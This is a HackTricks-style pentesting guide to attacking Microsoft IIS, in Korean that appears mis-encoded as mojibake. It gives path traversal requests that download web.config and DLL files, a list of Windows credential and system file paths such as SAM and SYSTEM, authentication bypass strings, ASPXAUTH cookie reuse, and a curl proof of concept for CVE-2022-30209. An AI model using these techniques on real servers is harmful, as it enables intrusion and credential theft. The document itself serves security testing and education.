# IIS - ì¸í„°ë„· ì •ë³´ ì„œë¹„ìŠ¤

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

í…ŒìŠ¤íŠ¸ ì‹¤í–‰ íŒŒì¼ í™•ì¥ì:

* asp
* aspx
* config
* php

## ë‚´ë¶€ IP ì£¼ì†Œ ë…¸ì¶œ

302 ì‘ë‹µì„ ë°›ëŠ” ëª¨ë“  IIS ì„œë²„ì—ì„œ Host í—¤ë”ë¥¼ ì œê±°í•˜ê³  HTTP/1.0ì„ ì‚¬ìš©í•´ ë³¼ ìˆ˜ ìˆìœ¼ë©°, ì‘ë‹µ ë‚´ì˜ Location í—¤ë”ê°€ ë‚´ë¶€ IP ì£¼ì†Œë¥¼ ê°€ë¦¬í‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
ë‚´ë¶€ IPë¥¼ ê³µê°œí•˜ëŠ” ì‘ë‹µ:
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## .config íŒŒì¼ ì‹¤í–‰

.config íŒŒì¼ì„ ì—…ë¡œë“œí•˜ê³  ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ìˆ˜í–‰í•˜ëŠ” í•œ ê°€ì§€ ë°©ë²•ì€ HTML ì£¼ì„ ì•ˆì— íŒŒì¼ ëì— ì½”ë“œë¥¼ ì¶”ê°€í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤: [ì—¬ê¸°ì—ì„œ ì˜ˆì œ ë‹¤ìš´ë¡œë“œ](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ëŠ” ë°©ë²•ê³¼ ê¸°ìˆ ì— ëŒ€í•œ ë” ë§ì€ ì •ë³´ëŠ” [ì—¬ê¸°](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## IIS ë°œê²¬ ë¸Œë£¨íŠ¸í¬ìŠ¤

ì œê°€ ë§Œë“  ëª©ë¡ì„ ë‹¤ìš´ë¡œë“œí•˜ì„¸ìš”:

{% file src="../../.gitbook/assets/iisfinal.txt" %}

ë‹¤ìŒ ëª©ë¡ì˜ ë‚´ìš©ì„ ë³‘í•©í•˜ì—¬ ìƒì„±ë˜ì—ˆìŠµë‹ˆë‹¤:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

í™•ì¥ìë¥¼ ì¶”ê°€í•˜ì§€ ì•Šê³  ì‚¬ìš©í•˜ì„¸ìš”. í•„ìš”í•œ íŒŒì¼ì€ ì´ë¯¸ í™•ì¥ìê°€ ìˆìŠµë‹ˆë‹¤.

## ê²½ë¡œ íƒìƒ‰

### ì†ŒìŠ¤ ì½”ë“œ ìœ ì¶œ

ì „ì²´ ì‘ì„± ë‚´ìš©ì€ ë‹¤ìŒì—ì„œ í™•ì¸í•˜ì„¸ìš”: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

{% hint style="info" %}
ìš”ì•½í•˜ìë©´, ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ í´ë” ì•ˆì— "**assemblyIdentity**" íŒŒì¼ê³¼ "**namespaces**"ì— ëŒ€í•œ ì°¸ì¡°ê°€ ìˆëŠ” ì—¬ëŸ¬ web.config íŒŒì¼ì´ ìˆìŠµë‹ˆë‹¤. ì´ ì •ë³´ë¥¼ í†µí•´ **ì‹¤í–‰ íŒŒì¼ì´ ìœ„ì¹˜í•œ ê³³**ì„ ì•Œ ìˆ˜ ìˆê³  ì´ë¥¼ ë‹¤ìš´ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
**ë‹¤ìš´ë¡œë“œí•œ Dlls**ì—ì„œ **ìƒˆë¡œìš´ namespaces**ë¥¼ ì°¾ì•„ ì ‘ê·¼í•˜ê³  web.config íŒŒì¼ì„ ì–»ì–´ ìƒˆë¡œìš´ namespacesì™€ assemblyIdentityë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë˜í•œ, **connectionstrings.config** ë° **global.asax** íŒŒì¼ì—ëŠ” í¥ë¯¸ë¡œìš´ ì •ë³´ê°€ í¬í•¨ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\\
{% endhint %}

**.Net MVC ì• í”Œë¦¬ì¼€ì´ì…˜**ì—ì„œ **web.config** íŒŒì¼ì€ **"assemblyIdentity"** XML íƒœê·¸ë¥¼ í†µí•´ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì˜ì¡´í•˜ëŠ” ê° ì´ì§„ íŒŒì¼ì„ ì§€ì •í•˜ëŠ” ì¤‘ìš”í•œ ì—­í• ì„ í•©ë‹ˆë‹¤.

### **ì´ì§„ íŒŒì¼ íƒìƒ‰**

**web.config** íŒŒì¼ì— ì ‘ê·¼í•˜ëŠ” ì˜ˆì‹œëŠ” ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤:
```markup
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
ì´ ìš”ì²­ì€ ë‹¤ìŒê³¼ ê°™ì€ ë‹¤ì–‘í•œ ì„¤ì • ë° ì¢…ì†ì„±ì„ ë“œëŸ¬ëƒ…ë‹ˆë‹¤:

* **EntityFramework** ë²„ì „
* ì›¹í˜ì´ì§€, í´ë¼ì´ì–¸íŠ¸ ê²€ì¦ ë° JavaScriptì— ëŒ€í•œ **AppSettings**
* ì¸ì¦ ë° ëŸ°íƒ€ì„ì„ ìœ„í•œ **System.web** êµ¬ì„±
* **System.webServer** ëª¨ë“ˆ ì„¤ì •
* **Microsoft.Owin**, **Newtonsoft.Json**, ë° **System.Web.Mvc**ì™€ ê°™ì€ ì—¬ëŸ¬ ë¼ì´ë¸ŒëŸ¬ë¦¬ì— ëŒ€í•œ **Runtime** ì–´ì…ˆë¸”ë¦¬ ë°”ì¸ë”©

ì´ ì„¤ì •ì€ **/bin/WebGrease.dll**ê³¼ ê°™ì€ íŠ¹ì • íŒŒì¼ì´ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ /bin í´ë” ë‚´ì— ìœ„ì¹˜í•˜ê³  ìˆìŒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

### **ë£¨íŠ¸ ë””ë ‰í† ë¦¬ íŒŒì¼**

**/global.asax** ë° (ë¯¼ê°í•œ ë¹„ë°€ë²ˆí˜¸ë¥¼ í¬í•¨í•˜ëŠ”) **/connectionstrings.config**ì™€ ê°™ì€ ë£¨íŠ¸ ë””ë ‰í† ë¦¬ì—ì„œ ë°œê²¬ëœ íŒŒì¼ì€ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ êµ¬ì„± ë° ìš´ì˜ì— í•„ìˆ˜ì ì…ë‹ˆë‹¤.

### **ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ë° Web.Config**

MVC ì• í”Œë¦¬ì¼€ì´ì…˜ì€ ê° íŒŒì¼ì—ì„œ ë°˜ë³µì ì¸ ì„ ì–¸ì„ í”¼í•˜ê¸° ìœ„í•´ íŠ¹ì • ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì— ëŒ€í•œ ì¶”ê°€ **web.config íŒŒì¼**ë„ ì •ì˜í•©ë‹ˆë‹¤. ì´ëŠ” ë‹¤ë¥¸ **web.config**ë¥¼ ë‹¤ìš´ë¡œë“œ ìš”ì²­í•˜ëŠ” ì˜ˆì—ì„œ ë³´ì—¬ì§‘ë‹ˆë‹¤:
```markup
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **DLL ë‹¤ìš´ë¡œë“œ**

ì‚¬ìš©ì ì •ì˜ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì˜ ì–¸ê¸‰ì€ /bin ë””ë ‰í† ë¦¬ì— ìˆëŠ” "**WebApplication1**"ì´ë¼ëŠ” DLLì„ ì•”ì‹œí•©ë‹ˆë‹¤. ê·¸ì— ë”°ë¼ **WebApplication1.dll**ì„ ë‹¤ìš´ë¡œë“œí•˜ëŠ” ìš”ì²­ì´ í‘œì‹œë©ë‹ˆë‹¤:
```markup
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
ì´ê²ƒì€ /bin ë””ë ‰í† ë¦¬ì— **System.Web.Mvc.dll** ë° **System.Web.Optimization.dll**ê³¼ ê°™ì€ ë‹¤ë¥¸ í•„ìˆ˜ DLLì˜ ì¡´ì¬ë¥¼ ì‹œì‚¬í•©ë‹ˆë‹¤.

DLLì´ **WebApplication1.Areas.Minded**ë¼ëŠ” ë„¤ì„ìŠ¤í˜ì´ìŠ¤ë¥¼ ê°€ì ¸ì˜¤ëŠ” ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ, ê³µê²©ìëŠ” **/area-name/Views/**ì™€ ê°™ì€ ì˜ˆì¸¡ ê°€ëŠ¥í•œ ê²½ë¡œì— ë‹¤ë¥¸ web.config íŒŒì¼ì´ ì¡´ì¬í•  ê°€ëŠ¥ì„±ì„ ì¶”ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ íŒŒì¼ë“¤ì€ /bin í´ë”ì— ìˆëŠ” ë‹¤ë¥¸ DLLì— ëŒ€í•œ íŠ¹ì • êµ¬ì„± ë° ì°¸ì¡°ë¥¼ í¬í•¨í•˜ê³  ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, **/Minded/Views/web.config**ì— ëŒ€í•œ ìš”ì²­ì€ ë‹¤ë¥¸ DLL **WebApplication1.AdditionalFeatures.dll**ì˜ ì¡´ì¬ë¥¼ ë‚˜íƒ€ë‚´ëŠ” êµ¬ì„± ë° ë„¤ì„ìŠ¤í˜ì´ìŠ¤ë¥¼ ë“œëŸ¬ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì¼ë°˜ íŒŒì¼

[ì—¬ê¸°](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)ì—ì„œ
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 ì˜¤ë¥˜

ë‹¤ìŒê³¼ ê°™ì€ ì˜¤ë¥˜ê°€ í‘œì‹œë˜ë©´:

![](<../../.gitbook/assets/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (10) (2).png>)

ì„œë²„ê°€ **Host í—¤ë” ë‚´ì—ì„œ ì˜¬ë°”ë¥¸ ë„ë©”ì¸ ì´ë¦„ì„ ë°›ì§€ ëª»í–ˆë‹¤ëŠ” ì˜ë¯¸**ì…ë‹ˆë‹¤.\
ì›¹ í˜ì´ì§€ì— ì ‘ê·¼í•˜ê¸° ìœ„í•´ ì œê³µëœ **SSL ì¸ì¦ì„œ**ë¥¼ í™•ì¸í•´ë³´ë©´ ë„ë©”ì¸/ì„œë¸Œë„ë©”ì¸ ì´ë¦„ì„ ì°¾ì„ ìˆ˜ ìˆì„ì§€ë„ ëª¨ë¦…ë‹ˆë‹¤. ë§Œì•½ ê±°ê¸°ì— ì—†ë‹¤ë©´ **VHostsë¥¼ ë¬´ì‘ìœ„ë¡œ ì‹œë„**í•˜ì—¬ ì˜¬ë°”ë¥¸ ê²ƒì„ ì°¾ì•„ì•¼ í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

## ì°¾ì•„ë³¼ ê°€ì¹˜ê°€ ìˆëŠ” ì˜¤ë˜ëœ IIS ì·¨ì•½ì 

### Microsoft IIS ë¬¼ê²° ë¬¸ì â€œ\~â€ ì·¨ì•½ì /ê¸°ëŠ¥ â€“ ì§§ì€ íŒŒì¼/í´ë” ì´ë¦„ ë…¸ì¶œ

ì´ **ê¸°ìˆ **ì„ ì‚¬ìš©í•˜ì—¬ ë°œê²¬ëœ ëª¨ë“  í´ë” ë‚´ì—ì„œ **í´ë”ì™€ íŒŒì¼ì„ ë‚˜ì—´**í•´ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤(ê¸°ë³¸ ì¸ì¦ì´ í•„ìš”í•œ ê²½ìš°ì—ë„).\
ì´ ê¸°ìˆ ì˜ ì£¼ìš” ì œí•œ ì‚¬í•­ì€ ì„œë²„ê°€ ì·¨ì•½í•  ê²½ìš° **ê° íŒŒì¼/í´ë” ì´ë¦„ì˜ ì²« 6ê¸€ìì™€ íŒŒì¼ í™•ì¥ìì˜ ì²« 3ê¸€ìë§Œ ì°¾ì„ ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤.**

ì´ ì·¨ì•½ì ì„ í…ŒìŠ¤íŠ¸í•˜ê¸° ìœ„í•´ [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:`java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../.gitbook/assets/image (844).png>)

ì›ë³¸ ì—°êµ¬: [https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf](https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf)

**metasploit**ë¥¼ ì‚¬ìš©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤: `use scanner/http/iis_shortname_scanner`

### ê¸°ë³¸ ì¸ì¦ ìš°íšŒ

**ê¸°ë³¸ ì¸ì¦ì„ ìš°íšŒ**í•˜ê¸° ìœ„í•´ ë‹¤ìŒì— ì ‘ê·¼í•´ë³´ì„¸ìš”: `/admin:$i30:$INDEX_ALLOCATION/admin.php` ë˜ëŠ” `/admin::$INDEX_ALLOCATION/admin.php`

ì´ **ì·¨ì•½ì **ê³¼ ë§ˆì§€ë§‰ ì·¨ì•½ì ì„ **í˜¼í•©**í•˜ì—¬ ìƒˆë¡œìš´ **í´ë”**ë¥¼ ì°¾ê³  ì¸ì¦ì„ **ìš°íšŒ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ASP.NET Trace.AXD í™œì„±í™”ëœ ë””ë²„ê¹…

ASP.NETì€ ë””ë²„ê¹… ëª¨ë“œë¥¼ í¬í•¨í•˜ë©° ê·¸ íŒŒì¼ì€ `trace.axd`ë¼ê³  ë¶ˆë¦½ë‹ˆë‹¤.

ì´ëŠ” ì¼ì • ê¸°ê°„ ë™ì•ˆ ì• í”Œë¦¬ì¼€ì´ì…˜ì— ëŒ€í•œ ëª¨ë“  ìš”ì²­ì˜ ë§¤ìš° ìƒì„¸í•œ ë¡œê·¸ë¥¼ ìœ ì§€í•©ë‹ˆë‹¤.

ì´ ì •ë³´ì—ëŠ” ì›ê²© í´ë¼ì´ì–¸íŠ¸ IP, ì„¸ì…˜ ID, ëª¨ë“  ìš”ì²­ ë° ì‘ë‹µ ì¿ í‚¤, ë¬¼ë¦¬ì  ê²½ë¡œ, ì†ŒìŠ¤ ì½”ë“œ ì •ë³´, ê·¸ë¦¬ê³  ì ì¬ì ìœ¼ë¡œ ì‚¬ìš©ì ì´ë¦„ê³¼ ë¹„ë°€ë²ˆí˜¸ê°€ í¬í•¨ë©ë‹ˆë‹¤.

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTH ì¿ í‚¤

ASPXAUTHëŠ” ë‹¤ìŒ ì •ë³´ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤:

* **`validationKey`** (ë¬¸ìì—´): ì„œëª… ê²€ì¦ì— ì‚¬ìš©í•  í—¥ìŠ¤ ì¸ì½”ë”©ëœ í‚¤.
* **`decryptionMethod`** (ë¬¸ìì—´): (ê¸°ë³¸ê°’ â€œAESâ€).
* **`decryptionIV`** (ë¬¸ìì—´): í—¥ìŠ¤ ì¸ì½”ë”©ëœ ì´ˆê¸°í™” ë²¡í„°(ê¸°ë³¸ê°’ì€ ì œë¡œ ë²¡í„°).
* **`decryptionKey`** (ë¬¸ìì—´): ë³µí˜¸í™”ì— ì‚¬ìš©í•  í—¥ìŠ¤ ì¸ì½”ë”©ëœ í‚¤.

ê·¸ëŸ¬ë‚˜ ì¼ë¶€ ì‚¬ëŒë“¤ì€ ì´ëŸ¬í•œ ë§¤ê°œë³€ìˆ˜ì˜ **ê¸°ë³¸ê°’**ì„ ì‚¬ìš©í•˜ê³  **ì‚¬ìš©ìì˜ ì´ë©”ì¼ì„ ì¿ í‚¤ë¡œ ì‚¬ìš©**í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ASPXAUTH ì¿ í‚¤ë¥¼ ì‚¬ìš©í•˜ëŠ” **ê°™ì€ í”Œë«í¼**ì˜ ì›¹ì„ ì°¾ê³  ê³µê²© ëŒ€ìƒ ì„œë²„ì—ì„œ **ê°€ì§œë¡œ ê°€ì¥í•˜ê³ ì í•˜ëŠ” ì‚¬ìš©ìì˜ ì´ë©”ì¼ë¡œ ì‚¬ìš©ì ê³„ì •ì„ ìƒì„±**í•˜ë©´, **ë‘ ë²ˆì§¸ ì„œë²„ì˜ ì¿ í‚¤ë¥¼ ì²« ë²ˆì§¸ ì„œë²„ì—ì„œ ì‚¬ìš©**í•˜ì—¬ ì‚¬ìš©ìë¥¼ ê°€ì¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ ê³µê²©ì€ ì´ [**ê¸€**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19)ì—ì„œ ì„±ê³µí–ˆìŠµë‹ˆë‹¤.

## ìºì‹œëœ ë¹„ë°€ë²ˆí˜¸ë¡œ IIS ì¸ì¦ ìš°íšŒ (CVE-2022-30209) <a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a>

[ì „ì²´ ë³´ê³ ì„œ ì—¬ê¸°](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html): ì½”ë“œì˜ ë²„ê·¸ê°€ **ì‚¬ìš©ìê°€ ì œê³µí•œ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì œëŒ€ë¡œ í™•ì¸í•˜ì§€ ì•Šì•˜ê¸° ë•Œë¬¸ì—**, **ë¹„ë°€ë²ˆí˜¸ í•´ì‹œê°€ ìºì‹œì— ì´ë¯¸ ìˆëŠ” í‚¤ì— í•´ë‹¹í•˜ëŠ”** ê³µê²©ìëŠ” í•´ë‹¹ ì‚¬ìš©ìë¡œ ë¡œê·¸ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
